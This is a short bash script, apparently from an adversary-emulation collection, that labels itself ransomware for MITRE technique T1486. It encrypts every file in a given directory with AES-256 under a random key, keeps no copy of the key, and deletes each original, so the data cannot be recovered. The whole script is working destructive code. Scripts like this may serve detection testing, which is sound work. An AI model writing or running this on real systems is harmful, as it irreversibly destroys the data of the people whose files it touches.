#!/bin/bash

# This script will act as a ransomware, crypting all the files in a specific directory
# T1486 - Data Encrypted for Impact

# Set the directory as an argument
DIR=$1

# Check if the argument is empty
if [ -z "$DIR" ]; then
    echo "You must provide a directory as an argument."
    exit
fi

# Check if the argument is a valid directory
if [ ! -d "$DIR" ]; then
    echo "The argument provided is not a valid directory."
    exit
fi

# Generate a random key
key=$(openssl rand -hex 32)

# Encrypt all the files in the directory
echo "Encrypting files in $DIR..."
for file in $DIR/*; do
openssl enc -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$key" -in "$file" -out "$file.mthcht"
    rm "$file"
done

echo "Done!"
